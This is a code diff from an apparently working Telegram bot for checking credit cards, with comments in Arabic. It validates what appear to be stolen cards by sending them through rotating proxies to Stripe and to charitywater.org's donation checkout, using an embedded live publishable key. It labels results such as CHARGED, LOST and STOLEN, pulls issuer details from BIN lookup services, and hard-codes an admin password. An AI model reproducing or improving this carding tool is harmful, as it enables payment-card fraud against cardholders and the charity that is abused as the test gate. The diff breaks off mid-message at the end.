@@ -48,9 +48,8 @@ logger = logging.getLogger(__name__)
 # ═══════════════════════════════════════
 # قراءة التوكن ومعرف الأدمن
 # ═══════════════════════════════════════
-BOT_TOKEN    = os.environ.get('BOT_TOKEN')
-ADMIN_ID     = int(os.environ.get('ADMIN_ID', '6409122908'))
-ADMIN_PASS   = os.environ.get('ADMIN_PASS', 'Nemo@1986')   # غيّر القيمة من متغيرات البيئة
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+ADMIN_ID   = int(os.environ.get('ADMIN_ID', '6409122908'))
 
 if not BOT_TOKEN or not ADMIN_ID:
     print("Error: BOT_TOKEN or ADMIN_ID not set in environment variables")
@@ -388,32 +387,6 @@ proxy_pool = ProxyPool()
 print("Proxy pool initialized")
 sys.stdout.flush()
 
-# ─── نظام إلغاء المهام ───
-user_active_task = {}   # {user_id: {'stop': threading.Event, 'name': str}}
-_task_lock = threading.Lock()
-
-def start_user_task(user_id, name):
-    """إيقاف أي مهمة سابقة وبدء مهمة جديدة — يرجع stop_event"""
-    with _task_lock:
-        prev = user_active_task.get(user_id)
-        if prev:
-            prev['stop'].set()
-        stop = threading.Event()
-        user_active_task[user_id] = {'stop': stop, 'name': name}
-    return stop
-
-def cancel_user_task(user_id):
-    """إلغاء المهمة الجارية للمستخدم إن وُجدت"""
-    with _task_lock:
-        task = user_active_task.pop(user_id, None)
-    if task:
-        task['stop'].set()
-
-def finish_user_task(user_id):
-    """إنهاء المهمة بعد اكتمالها طبيعياً"""
-    with _task_lock:
-        user_active_task.pop(user_id, None)
-
 # ═══════════════════════════════════════
 # سحب بروكسيات GitHub
 # ═══════════════════════════════════════
@@ -517,90 +490,87 @@ def fetch_proxies_from_github():
 
 def normalize_proxy(proxy_str):
     """
-    يوحّد أي صيغة بروكسي إلى صيغة واحدة قياسية: user:pass@host:port
-    أو host:port لو بدون مصادقة.
-
-    الصيغ المدعومة:
-      ip:port                             — عادي
-      ip:port:user:pass                   — مصادق (صيغة شائعة جداً)
-      user:pass:ip:port                   — مصادق (بعض المزودين)
-      user:pass@ip:port                   — مصادق (مع @)
-      http://user:pass@ip:port            — HTTP مصادق
-      https://user:pass@host:port         — HTTPS (Oxylabs etc)
-      host:port:user:pass                 — مصادق (hostname بدل IP)
+    Normalize any proxy format to a canonical string the pool stores.
+    Handles all known formats:
+      ip:port                                     → plain, needs test
+      user:pass@host:port                         → auth
+      host:port:user:pass                         → BrightData / some panels
+      host:port:user:pass:more:colons             → same, pass may contain colons
+      http://... / https://... / socks5://...     → keep as-is
+      socks5://user:pass@host:port               → keep as-is
+    Returns normalized string or None if unparseable.
     """
     s = proxy_str.strip()
     if not s:
         return None
 
-    # لو بيبدأ بـ http:// أو https:// خليه زي ما هو
-    if s.startswith('http://') or s.startswith('https://'):
+    # Already has a scheme → keep as-is
+    if '://' in s:
         return s
 
-    # لو فيه @ يبقى بالفعل user:pass@host:port
+    # Has @ → already in user:pass@host:port form
     if '@' in s:
         return s
 
-    # قسّم على ':'
+    # Split by colon to detect format
     parts = s.split(':')
 
     if len(parts) == 2:
-        # ip:port — عادي
-        return s
+        # host:port — plain, no auth
+        host, port = parts
+        if port.isdigit():
+            return s          # plain ip:port
+        return None           # garbage
 
-    if len(parts) == 4:
-        p0, p1, p2, p3 = parts
-        # تحقق من الشكل: ip:port:user:pass
-        # لو p0 يشبه IP (أرقام ونقاط) و p1 رقم → ip:port:user:pass
-        import re as _re
-        if _re.match(r'^\d{1,3}(\.\d{1,3}){3}$', p0) and p1.isdigit():
-            # ip:port:user:pass → user:pass@ip:port
-            return f"{p2}:{p3}@{p0}:{p1}"
-        # لو p2 يشبه IP و p3 رقم → user:pass:ip:port
-        if _re.match(r'^\d{1,3}(\.\d{1,3}){3}$', p2) and p3.isdigit():
-            # user:pass:ip:port → user:pass@ip:port
-            return f"{p0}:{p1}@{p2}:{p3}"
-        # hostname:port:user:pass (hostname مش IP)
-        if p1.isdigit():
-            return f"{p2}:{p3}@{p0}:{p1}"
-        # user:pass:hostname:port
-        if p3.isdigit():
-            return f"{p0}:{p1}@{p2}:{p3}"
+    if len(parts) >= 4:
+        # Detect host:port:user:pass (BrightData, many panels)
+        # Rule: parts[0] is a hostname/IP, parts[1] is a numeric port
+        if parts[1].isdigit():
+            host  = parts[0]
+            port  = parts[1]
+            # everything after port[1] is user:pass (pass may contain colons)
+            rest  = ':'.join(parts[2:])          # "user:pass" or "user:pass:extra"
+            # rest split into user + pass at FIRST colon
+            first_colon = rest.find(':')
+            if first_colon == -1:
+                return None   # only username, no password — can't use
+            user  = rest[:first_colon]
+            passw = rest[first_colon+1:]
+            return f"{user}:{passw}@{host}:{port}"
 
-    # أي صيغة تانية — خليها زي ما هي
-    return s
+    if len(parts) == 3:
+        # Could be host:port:something — ambiguous, try host:port
+        if parts[1].isdigit():
+            return f"{parts[0]}:{parts[1]}"  # drop the third part
+    
+    return None
 
 
 def parse_proxy(proxy_str):
-    """
-    يحول أي صيغة بروكسي إلى dict مناسب لـ requests.
-    بيمرر عبر normalize_proxy أولاً.
-    """
+    """Convert any proxy string to a requests-compatible dict."""
     s = normalize_proxy(proxy_str)
     if not s:
         return None
+    if s.startswith('socks5://'):
+        return {"http": s, "https": s}
     if s.startswith('https://'):
         return {"http": s, "https": s}
     if s.startswith('http://'):
         return {"http": s, "https": s}
-    # user:pass@host:port  أو  host:port
     return {"http": f"http://{s}", "https": f"http://{s}"}
 
 
 def is_rotating_proxy(proxy_str):
     """
-    يحدد إذا كان البروكسي مصادق عليه → يُضاف مباشرة بدون اختبار.
-    بيشيك بعد normalize_proxy علشان يلتقط صيغة ip:port:user:pass.
+    Returns True for authenticated / rotating proxies → add without testing.
+    Detects: @ in string, any scheme prefix, or host:port:user:pass layout.
     """
-    s = normalize_proxy(proxy_str or '')
-    if not s:
-        return False
-    if '@' in s:
+    s = proxy_str.strip()
+    if '@' in s or '://' in s:
         return True
-    if s.startswith('https://'):
-        return True
-    # http://user:pass@... — لو فيه @ بعد :// يبقى مصادق
-    if s.startswith('http://') and '@' in s:
+    # host:port:user:pass — second token is port digit
+    parts = s.split(':')
+    if len(parts) >= 4 and parts[1].isdigit():
         return True
     return False
 
@@ -626,21 +596,21 @@ def check_proxy_accurate(proxy):
 
 def add_proxies_to_pool(proxy_list):
     """
-    يضيف قائمة بروكسيات:
-    - الدوارة/المصادق عليها تُضاف فوراً بدون اختبار.
-    - العادية (ip:port) تُختبر أولاً ثم تُضاف.
-    يطبّق normalize_proxy على كل الصيغ أولاً.
+    Adds proxies to the pool.
+    - Authenticated / rotating → added immediately without testing.
+    - Plain ip:port             → tested first via httpbin.
     """
-    # normalize كل الـ proxies أولاً
+    # Normalize all entries first; drop unparseable ones
     normalized = []
-    for p in proxy_list:
-        n = normalize_proxy(p)
+    for raw in proxy_list:
+        n = normalize_proxy(raw.strip())
         if n:
             normalized.append(n)
-    proxy_list = normalized
+        else:
+            logger.warning(f"[proxy] unparseable: {raw!r}")
 
-    rotating = [p for p in proxy_list if is_rotating_proxy(p)]
-    regular  = [p for p in proxy_list if not is_rotating_proxy(p)]
+    rotating = [p for p in normalized if is_rotating_proxy(p)]
+    regular  = [p for p in normalized if not is_rotating_proxy(p)]
     working  = []
 
     # الدوارة مباشرة
@@ -922,21 +892,6 @@ def check_card_on_site(card_str, site_url, proxy=None):
                                   'try again later', 'api_error', 'timeout')):
             return "GATE_DOWN", err_msg or "مشكلة مؤقتة فى البوابة"
 
-        # ─ بطاقة مفقودة / مسروقة ─
-        if d_code == 'lost_card' or 'lost card' in low:
-            return "LOST", err_msg or "بطاقة مفقودة"
-        if d_code == 'stolen_card' or 'stolen card' in low:
-            return "STOLEN", err_msg or "بطاقة مسروقة"
-
-        # ─ تجاوز حد المعاملات ─
-        if d_code in ('card_velocity_exceeded', 'withdrawal_count_limit_exceeded'):
-            return "VELOCITY", err_msg or "تجاوز حد المعاملات"
-
-        # ─ Do Not Honor / رفض عام بالكود ─
-        if d_code in ('do_not_honor', 'generic_decline', 'transaction_not_allowed',
-                      'service_not_allowed', 'blocked'):
-            return "HONOR", err_msg or "Do Not Honor"
-
         return "DECLINED", err_msg or "مرفوضة"
     except requests.exceptions.ProxyError:
         return "PROXY_ERROR", "فشل البروكسي"
@@ -1011,7 +966,7 @@ GATES = {
 # ════════════════════════════════════════
 CW_BASE      = "https://www.charitywater.org"
 CW_PK        = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ"
-CW_STRIPE_VER = "2024-06-20"          # stable version — dahlia is beta and often rejected
+CW_STRIPE_VER = "2026-03-25.dahlia"
 CW_CAMPAIGN   = "e312f371-fcd2-446e-8b51-c6c393b2b0af"
 CW_UA         = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
@@ -1120,28 +1075,13 @@ def check_cw_gate(card_str, proxy=None):
             return "ERROR", f"Stripe parse error HTTP {r1.status_code}"
 
         if "error" in r1j:
-            e  = r1j["error"]
-            t  = e.get("type","");  c_ = e.get("code","");  m_ = e.get("message","")
-            dc = e.get("decline_code","")
-            # card_error → always DECLINED (card problem, not infra)
-            CARD_CODES = ("invalid_number","incorrect_number","invalid_expiry_month",
-                          "invalid_expiry_year","expired_card","invalid_cvc",
-                          "card_declined","do_not_honor","insufficient_funds",
-                          "lost_card","stolen_card","pickup_card","restricted_card",
-                          "security_violation","incorrect_pin","card_velocity_exceeded")
-            if t == "card_error" or c_ in CARD_CODES or dc in CARD_CODES:
-                return "DECLINED", m_ or c_ or dc
-            # Stripe API / infra error → retry
-            if t == "api_error" or r1.status_code >= 500:
-                return "ERROR", m_ or f"Stripe HTTP {r1.status_code}"
-            # authentication / rate limit → ERROR
-            if t in ("authentication_error", "rate_limit_error"):
-                return "ERROR", m_
-            # anything else with a card message → treat as DECLINED
-            if m_ and any(x in m_.lower() for x in ("card","declined","invalid",
-                                                      "expired","blocked","funds")):
+            e = r1j["error"]
+            t = e.get("type",""); c_ = e.get("code",""); m_ = e.get("message","")
+            if t == "card_error" or c_ in ("invalid_number","incorrect_number",
+                                            "invalid_expiry_month","invalid_expiry_year",
+                                            "expired_card","invalid_cvc"):
                 return "DECLINED", m_
-            return "ERROR", m_ or f"Stripe error type={t}"
+            return "ERROR", m_
 
         ctoken = r1j.get("id","")
         if not ctoken:
@@ -1205,83 +1145,19 @@ def check_cw_gate(card_str, proxy=None):
                 return "CHARGED", "Donation accepted"
             return "ERROR", f"CW HTTP {r2.status_code}"
 
-        # ─ helpers ─
-        _r2_str = str(r2j).lower()
-
-        def _classify_msg(msg):
-            """مصنّف مشترك لنص رسالة الخطأ"""
-            low = msg.lower()
-            if any(x in low for x in ("authentication","3d secure","verify",
-                                       "requires_action","action_required")):
-                return "OTP", msg
-            if "insufficient" in low:
-                return "APPROVED", f"Approved ‑ Insufficient Funds: {msg}"
-            if "lost" in low:        return "LOST",     msg
-            if "stolen" in low:      return "STOLEN",   msg
-            if "velocity" in low or "too many" in low:
-                                     return "VELOCITY", msg
-            return "DECLINED", msg
-
-        # ─ 3DS / Authentication required (top-level keys) ─
-        if r2j.get("requires_action") or r2j.get("next_action") \
-           or "authentication_required" in _r2_str \
-           or "requires_action" in _r2_str:
-            return "OTP", "يتطلب تحقق 3D Secure"
-
-        # ─ "error" (singular) ─  ← original format
         if "error" in r2j:
-            raw = r2j["error"]
-            if isinstance(raw, dict):
-                msg = raw.get("message","") or raw.get("code","")
-            else:
-                msg = str(raw)
-            return _classify_msg(msg or "CW error")
-
-        # ─ "errors" (plural)  ← Rails / JSON-API format — المشكلة الرئيسية ─
-        if "errors" in r2j:
-            raw = r2j["errors"]
-            if isinstance(raw, list):
-                msg = " | ".join(str(e) for e in raw)
-            elif isinstance(raw, dict):
-                msg = " | ".join(f"{k}: {v}" for k, v in raw.items())
-            else:
-                msg = str(raw)
-            return _classify_msg(msg or "CW errors")
-
-        # ─ "message" key (بعض الـ APIs ترجع message مباشرة) ─
-        if "message" in r2j and not r2j.get("success"):
-            msg = str(r2j["message"])
+            msg = r2j["error"].get("message","") or r2j["error"].get("code","")
             low = msg.lower()
-            if any(x in low for x in ("succeeded","accepted","created")):
-                return "CHARGED", msg
-            return _classify_msg(msg)
+            if "insufficient" in low:
+                return "APPROVED", f"Approved (insufficient funds)"
+            if any(x in low for x in ["declined","invalid","expired","lost","stolen","blocked"]):
+                return "DECLINED", msg
+            return "ERROR", msg
 
-        # ─ payment_intent nested ─
-        if "payment_intent" in r2j:
-            pi  = r2j["payment_intent"] or {}
-            st  = str(pi.get("status","")).lower()
-            lce = str(pi.get("last_payment_error",{}) or {}).lower()
-            if "succeeded" in st:
-                return "CHARGED", "Payment Intent succeeded"
-            if "requires_action" in st or "requires_action" in lce:
-                return "OTP", "3D Secure required"
-            if "requires_payment_method" in st:
-                return "DECLINED", "Payment method rejected"
-            return "DECLINED", f"PI status: {st}"
-
-        # ─ top-level status field ─
-        top_status = str(r2j.get("status","")).lower()
-        if "succeeded" in top_status or "success" in top_status:
-            return "CHARGED", "Status: succeeded"
-        if top_status in ("failed","canceled","cancelled","rejected"):
-            return "DECLINED", str(r2j.get("message","")) or top_status
-
-        # ─ success / donation / id (أصلية) ─
         if r2j.get("success") or r2j.get("donation") or r2j.get("id"):
             return "CHARGED", "Donation accepted — Charged!"
 
-        # ─ fallthrough ─ لا نرجع ERROR — نعتبرها DECLINED (بدل ما تكون مجهولة)
-        return "DECLINED", f"Unknown CW response: {str(r2j)[:100]}"
+        return "ERROR", str(r2j)[:120]
 
     except requests.exceptions.ProxyError:
         return "ERROR", "فشل البروكسي"
@@ -1292,10 +1168,7 @@ def check_cw_gate(card_str, proxy=None):
 
 def check_cw_with_retry(card_str):
     """Retry CharityWater gate with proxy fallback then direct."""
-    # الحالات النهائية — لا نعيد المحاولة لو وصلنا لواحدة منها
-    CW_FINAL = ("CHARGED", "APPROVED", "DECLINED", "OTP",
-                "LOST", "STOLEN", "VELOCITY")
-    last_status, last_reason = "DECLINED", "No attempts completed"
+    last_status, last_reason = "ERROR", "No attempts completed"
     attempts = [True, True, False]   # proxy, proxy, direct
     for i, use_proxy in enumerate(attempts):
         proxy = proxy_pool.get_proxy() if use_proxy else None
@@ -1304,24 +1177,20 @@ def check_cw_with_retry(card_str):
         except Exception as e:
             status, reason = "ERROR", f"{type(e).__name__}: {str(e)[:80]}"
         last_status, last_reason = status, reason
-        if status in CW_FINAL:
-            if proxy: proxy_pool.report_success(proxy)
+        if status in ("CHARGED", "APPROVED", "DECLINED"):
+            if proxy:
+                proxy_pool.report_success(proxy)
             return status, reason
-        # ERROR / proxy problem → عاقب البروكسي وأعد المحاولة
-        if proxy: proxy_pool.report_failure(proxy)
+        if proxy:
+            proxy_pool.report_failure(proxy)
         if i < len(attempts) - 1:
-            time.sleep(1.5)
-    # بعد كل المحاولات — رجّع DECLINED بدل ERROR (أوضح للمستخدم)
-    if last_status == "ERROR":
-        return "DECLINED", f"Gateway unreachable: {last_reason[:80]}"
+            time.sleep(1)
     return last_status, last_reason
 
 
 def _check_one_card(card_str, gate_id):
     """Route card to correct checker based on gate type."""
-    gate = GATES.get(gate_id)
-    if not gate:
-        return "ERROR", f"Invalid gate_id: {gate_id}"
+    gate = GATES[gate_id]
     if gate.get('type') == 'cw':
         return check_cw_with_retry(card_str)
     return check_card_with_retry(card_str, gate['site'])
@@ -1350,195 +1219,81 @@ def format_cw_result(status, reason, card_str, bin_inf):
 
 def _is_hit(status, gate_id):
     if GATES[gate_id].get('type') == 'cw':
-        return status in ('CHARGED', 'APPROVED', 'OTP')
+        return status in ('CHARGED', 'APPROVED')
     return status in ('PASSED', 'OTP', 'LIVE', 'CCN')
 
 
-_bin_cache      = {}                    # {bin6: result_dict}
+_bin_cache      = {}          # {bin6: result_dict}
 _bin_cache_lock = threading.Lock()
-_bin_last_call  = [0.0]                 # rate-limit tracker
-_bin_semaphore  = threading.Semaphore(3)  # max 3 concurrent HTTP BIN calls
+_bin_last_call  = [0.0]       # rate-limit tracker (1 call per 0.6s)
 
 def get_bin_info(bin6):
     bin6 = str(bin6)[:6]
 
-    # ── 1. Cache hit (fast) ───────────────────────────────────────────────────
+    # ── 1. Cache hit ─────────────────────────────────────────────────────────
     with _bin_cache_lock:
         if bin6 in _bin_cache:
             return _bin_cache[bin6]
 
-    # ── 2. Rate-limit OUTSIDE the cache lock ─────────────────────────────────
-    # الخطأ السابق: كان بيعمل sleep داخل الـ lock فيقفل كل الـ threads
-    with _bin_semaphore:   # يسمح بـ 3 طلبات متزامنة بس
-        # إعادة التحقق من الـ cache بعد ما حصلنا على الـ semaphore
-        with _bin_cache_lock:
-            if bin6 in _bin_cache:
-                return _bin_cache[bin6]
-
-        # Rate-limit: احسب الانتظار خارج أي lock
-        with _bin_cache_lock:
-            wait = 0.65 - (time.time() - _bin_last_call[0])
-            _bin_last_call[0] = time.time()   # احجز الفتحة فوراً
+    # ── 2. Rate-limit: max ~1.6 req/sec across all threads ───────────────────
+    with _bin_cache_lock:
+        wait = 0.6 - (time.time() - _bin_last_call[0])
         if wait > 0:
-            time.sleep(wait)   # ← sleep خارج الـ lock تماماً
+            time.sleep(wait)
+        _bin_last_call[0] = time.time()
 
     EMPTY = {"brand": "?", "type": "?", "bank": "?", "country": "?", "flag": "🌍"}
 
-    # ── 3. Country code → flag emoji helper ──────────────────────────────────
-    def _flag(cc):
-        if not cc or len(cc) < 2:
-            return "🌍"
+    # ── 3. Try sources in order ───────────────────────────────────────────────
+    sources = [
+        f"https://lookup.binlist.net/{bin6}",
+        f"https://binlookup.io/api/bin/{bin6}",
+    ]
+
+    result = None
+    for url in sources:
         try:
-            return chr(0x1F1E0 + ord(cc[0].upper()) - 65) + \
-                   chr(0x1F1E0 + ord(cc[1].upper()) - 65)
-        except Exception:
-            return "🌍"
-
-    # ── 4. Parsers per API schema ─────────────────────────────────────────────
-    def _parse_binlist(d):
-        """binlist.net / bincheck.me schema"""
-        brand = (d.get("scheme") or d.get("brand") or "").upper()
-        typ   = (d.get("type") or "").upper()
-        bank_info = d.get("bank") or {}
-        bank  = bank_info.get("name") if isinstance(bank_info, dict) else "?"
-        ctry  = d.get("country") or {}
-        country_name = ctry.get("name") or ctry.get("alpha2") or "?"
-        flag  = ctry.get("emoji") or _flag(ctry.get("alpha2", ""))
-        if brand or typ:
-            return {"brand": brand or "?", "type": typ or "?",
-                    "bank": bank, "country": country_name, "flag": flag}
-        return None
-
-    def _parse_binlookup(d):
-        """binlookup.io  {'bin': {...}} or flat"""
-        inner = d.get("bin") or d
-        brand = (inner.get("brand") or inner.get("scheme") or "").upper()
-        typ   = (inner.get("type") or "").upper()
-        bank  = inner.get("bank_name") or inner.get("bank") or "?"
-        cc    = inner.get("country_code") or inner.get("country") or ""
-        country_name = inner.get("country_name") or cc or "?"
-        flag  = inner.get("country_flag") or _flag(cc)
-        if brand or typ:
-            return {"brand": brand or "?", "type": typ or "?",
-                    "bank": bank, "country": country_name, "flag": flag}
-        return None
-
-    def _parse_bintable(d):
-        """api.bintable.com  {'data': {...}}"""
-        inner = d.get("data") or d
-        brand = (inner.get("scheme") or inner.get("brand") or "").upper()
-        typ   = (inner.get("type") or inner.get("card_type") or "").upper()
-        bank  = inner.get("bank") or inner.get("bank_name") or "?"
-        cc    = inner.get("country_code") or inner.get("country") or ""
-        country_name = inner.get("country_name") or cc or "?"
-        flag  = _flag(cc)
-        if brand or typ:
-            return {"brand": brand or "?", "type": typ or "?",
-                    "bank": bank, "country": country_name, "flag": flag}
-        return None
-
-    def _parse_neutrino(d):
-        """neutrinoapi.com  flat dict"""
-        brand = (d.get("card-brand") or d.get("scheme") or "").upper()
-        typ   = (d.get("card-type") or "").upper()
-        bank  = d.get("bank-name") or "?"
-        cc    = d.get("country-code") or d.get("country") or ""
-        country_name = d.get("country-name") or cc or "?"
-        flag  = _flag(cc)
-        if brand or typ:
-            return {"brand": brand or "?", "type": typ or "?",
-                    "bank": bank, "country": country_name, "flag": flag}
-        return None
-
-    def _parse_generic(d):
-        """Catch-all: try common field names"""
-        brand = (d.get("scheme") or d.get("brand") or d.get("network") or "").upper()
-        typ   = (d.get("type") or d.get("card_type") or "").upper()
-        bank  = (d.get("bank") or d.get("bank_name") or d.get("issuer") or "?")
-        if isinstance(bank, dict):
-            bank = bank.get("name") or "?"
-        cc    = (d.get("country_code") or d.get("country") or "")
-        if isinstance(cc, dict):
-            cc = cc.get("alpha2") or ""
-        country_name = (d.get("country_name") or d.get("country") or cc or "?")
-        if isinstance(country_name, dict):
-            country_name = country_name.get("name") or cc or "?"
-        flag  = _flag(cc)
-        if brand or typ:
-            return {"brand": brand or "?", "type": typ or "?",
-                    "bank": bank, "country": country_name, "flag": flag}
-        return None
-
-        # ── 5. Sources list: (url, extra_headers, parser_fn) ─────────────────
-        UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        sources = [
-            # binlist.net — most popular (move to first priority)
-            (f"https://lookup.binlist.net/{bin6}",
-             {"Accept-Version": "3", "User-Agent": UA},
-             _parse_binlist),
-            # bincheck.me — same schema, higher limits
-            (f"https://bincheck.me/api/{bin6}",
-             {"User-Agent": UA},
-             _parse_binlist),
-            # binlookup.io
-            (f"https://binlookup.io/api/bin/{bin6}",
-             {"User-Agent": UA},
-             _parse_binlookup),
-            # bintable.com — free tier
-            (f"https://api.bintable.com/v1/{bin6}?api_key=",
-             {"User-Agent": UA},
-             _parse_bintable),
-            # bins.antipublic.cc
-            (f"https://bins.antipublic.cc/bins/{bin6}",
-             {"User-Agent": UA},
-             _parse_generic),
-            # bin-checker.net
-            (f"https://bin-checker.net/api/{bin6}",
-             {"User-Agent": UA},
-             _parse_generic),
-            # neutrino
-            (f"https://neutrinoapi.net/bin-lookup?bin-number={bin6}&output-format=json",
-             {"User-Agent": UA},
-             _parse_neutrino),
-            # card-bin-checker.com (backup)
-            (f"https://card-bin-checker.com/api/{bin6}",
-             {"User-Agent": UA},
-             _parse_generic),
-        ]
-
-        result = None
-        for url, hdrs, parser in sources:
-            try:
-                r = requests.get(url, headers=hdrs, timeout=8)
-                if r.status_code == 429:
-                    time.sleep(2)
-                    continue
-                if r.status_code not in (200, 201):
-                    logger.warning(f"BIN API {url} returned {r.status_code}")
-                    continue
-                try:
-                    d = r.json()
-                except Exception as e:
-                    logger.warning(f"BIN API {url} JSON parse error: {e}")
-                    continue
-                parsed = parser(d)
-                if parsed:
-                    # تأكد إن bank مش فاضية
-                    if parsed.get("bank","?") in ("?", "", None):
-                        parsed["bank"] = "Unknown Bank"
-                    result = parsed
-                    logger.info(f"BIN {bin6} found from {url}")
-                    break
-            except Exception as e:
-                logger.warning(f"BIN API {url} error: {e}")
+            r = requests.get(url, timeout=6,
+                             headers={"Accept-Version": "3",
+                                      "User-Agent": "Mozilla/5.0"})
+            if r.status_code == 429:
+                time.sleep(1.5)
                 continue
+            if r.status_code != 200:
+                continue
+            d = r.json()
 
-        if result is None:
-            result = EMPTY
+            # binlist.net schema
+            if "scheme" in d or "type" in d:
+                result = {
+                    "brand":   (d.get("scheme") or "?").upper(),
+                    "type":    (d.get("type")   or "?").upper(),
+                    "bank":    (d.get("bank")   or {}).get("name") or "?",
+                    "country": (d.get("country") or {}).get("name") or "?",
+                    "flag":    (d.get("country") or {}).get("emoji") or "🌍",
+                }
+                break
 
-        with _bin_cache_lock:
-            _bin_cache[bin6] = result
-        return result
+            # binlookup.io schema  {"bin":{"brand":"VISA","type":"DEBIT",...}}
+            inner = d.get("bin") or d
+            if inner.get("brand") or inner.get("type"):
+                result = {
+                    "brand":   (inner.get("brand")   or "?").upper(),
+                    "type":    (inner.get("type")    or "?").upper(),
+                    "bank":    inner.get("bank_name") or inner.get("bank") or "?",
+                    "country": inner.get("country_name") or inner.get("country") or "?",
+                    "flag":    inner.get("country_flag") or "🌍",
+                }
+                break
+        except Exception:
+            continue
+
+    if result is None:
+        result = EMPTY
+
+    with _bin_cache_lock:
+        _bin_cache[bin6] = result
+    return result
 
 # ═══════════════════════════════════════
 # الحالة العامة
@@ -1623,12 +1378,11 @@ def main_menu_kb(user_id=None):
         btn("🎫 Redeem Code",  STYLE_SUCCESS, callback_data="menu_redeem"),
     )
     kb.add(
+        btn("⚙️ Settings",     STYLE_PRIMARY, callback_data="menu_settings"),
         btn("🔍 Gate Scanner", STYLE_PRIMARY, callback_data="menu_gate_scan"),
     )
     if user_id and user_id == ADMIN_ID:
-        kb.add(
-            btn("🛠️ Admin Panel", STYLE_DANGER, callback_data="menu_admin"),
-        )
+        kb.add(btn("🛠️ Admin Panel", STYLE_DANGER, callback_data="menu_admin"))
     kb.add(
         btn("🆘 Support", STYLE_PRIMARY, url="https://t.me/BaBa_MeDia_0"),
     )
@@ -1666,14 +1420,24 @@ def after_bulk_kb(has_export=False):
 # ═══════════════════════════════════════
 # إرسال / تحديث رسالة البانر
 # ═══════════════════════════════════════
-def _send_banner_fresh(chat_id, user_id, caption, markup):
-    """إرسال رسالة بانر جديدة تماماً (بدون حذف أي رسالة قديمة)"""
+def send_banner(chat_id, user_id, caption, markup):
+    """إرسال رسالة البانر جديدة وحفظ معرفها"""
     global BANNER_FILE_ID
+
+    # احذف الرسالة القديمة إن وُجدت
+    old_id = user_main_message.get(user_id)
+    if old_id:
+        try:
+            bot.delete_message(chat_id, old_id)
+        except:
+            pass
+
     photo = None
     if BANNER_FILE_ID:
         photo = BANNER_FILE_ID
     elif os.path.exists(BANNER_PATH):
         photo = open(BANNER_PATH, 'rb')
+
     try:
         if photo:
             msg = bot.send_photo(chat_id, photo, caption=caption,
@@ -1688,34 +1452,14 @@ def _send_banner_fresh(chat_id, user_id, caption, markup):
         user_main_message[user_id] = msg.message_id
         return msg.message_id
     except Exception as e:
-        logger.error(f"send_banner_fresh error: {e}")
+        logger.error(f"send_banner error: {e}")
         return None
-
-def send_banner(chat_id, user_id, caption, markup):
-    """
-    إرسال/تحديث رسالة البانر.
-    - لو فيه رسالة موجودة → edit (نفس الرسالة، ما تتكررش)
-    - لو ما فيش → send جديد
-    """
-    mid = user_main_message.get(user_id)
-    if mid:
-        # حاول edit الرسالة الموجودة أولاً
-        try:
-            bot.edit_message_caption(
-                caption=caption, chat_id=chat_id, message_id=mid,
-                reply_markup=markup, parse_mode="Markdown"
-            )
-            return mid
-        except Exception:
-            # الرسالة اتحذفت أو مش موجودة → ابعت جديد
-            user_main_message.pop(user_id, None)
-    return _send_banner_fresh(chat_id, user_id, caption, markup)
 
 def edit_banner(user_id, chat_id, caption, markup, msg_id=None):
     """تحديث رسالة البانر الموجودة (الكابشن والأزرار فقط)"""
     mid = msg_id or user_main_message.get(user_id)
     if not mid:
-        return _send_banner_fresh(chat_id, user_id, caption, markup)
+        return send_banner(chat_id, user_id, caption, markup)
     try:
         bot.edit_message_caption(
             caption=caption, chat_id=chat_id, message_id=mid,
@@ -1724,10 +1468,8 @@ def edit_banner(user_id, chat_id, caption, markup, msg_id=None):
         user_main_message[user_id] = mid
         return mid
     except Exception as e:
-        # الرسالة اتحذفت — ابعت جديد
-        user_main_message.pop(user_id, None)
         logger.warning(f"edit_banner fallback – sending new: {e}")
-        return _send_banner_fresh(chat_id, user_id, caption, markup)
+        return send_banner(chat_id, user_id, caption, markup)
 
 # ═══════════════════════════════════════
 # شريط التقدم
@@ -1747,11 +1489,6 @@ STATUS_LABEL = {
     # CharityWater gate statuses
     "CHARGED":        ("✅", "CHARGED"),
     "APPROVED":       ("✅", "Approved: (insufficient)"),
-    # ─ تصنيفات رفض تفصيلية ─
-    "HONOR":          ("❌", "Do Not Honor"),
-    "VELOCITY":       ("🔄", "Velocity Exceeded"),
-    "LOST":           ("🚫", "Lost Card"),
-    "STOLEN":         ("🚫", "Stolen Card"),
 }
 
 def md_escape(t):
@@ -1787,8 +1524,12 @@ def cmd_start(message):
     conn.commit()
     conn.close()
 
-    # send_banner بتعمل edit لو فيه رسالة موجودة، وبتبعت جديد لو لأ
-    send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb(user_id))
+    # تجديد الرسالة الموجودة بدل إرسال رسالة جديدة في كل /start
+    mid = user_main_message.get(user_id)
+    if mid:
+        edit_banner(user_id, chat_id, MAIN_CAPTION, main_menu_kb(user_id), msg_id=mid)
+    else:
+        send_banner(chat_id, user_id, MAIN_CAPTION, main_menu_kb(user_id))
 
 # ═══════════════════════════════════════
 # /addproxy ip:port [ip:port ...] — أدمن فقط
@@ -1923,7 +1664,7 @@ def admin_check_pw(message):
     if user_id != ADMIN_ID:
         admin_session.pop(user_id, None)
         return
-    if message.text.strip() == ADMIN_PASS:
+    if message.text.strip() == "Nemo@1986":
         admin_session[user_id] = 'authenticated'
         show_admin_menu(user_id)
     else:
@@ -1958,25 +1699,22 @@ def admin_proxy_input(message):
         admin_session.pop(user_id, None)
         return
     raw = message.text.strip()
-    # استخرج الأسطر غير الفارغة
-    raw_lines = [p.strip() for p in raw.splitlines() if p.strip()]
-    # normalize كل سطر — بيعالج ip:port:user:pass وكل الصيغ التانية
-    proxies = []
-    for line in raw_lines:
-        n = normalize_proxy(line)
-        if n:
-            proxies.append(n)
+    # Accept any format — normalize each line
+    raw_lines = [p.strip() for p in raw.splitlines()
+                 if p.strip() and (':' in p or p.strip().startswith('http'))]
+    proxies   = [normalize_proxy(p) for p in raw_lines]
+    proxies   = [p for p in proxies if p]   # drop None (unparseable)
 
     if not proxies:
         bot.send_message(
             user_id,
             "❌ No valid proxies found.\n\n"
-            "*Accepted formats:*\n"
+            "Accepted formats:\n"
             "`ip:port`\n"
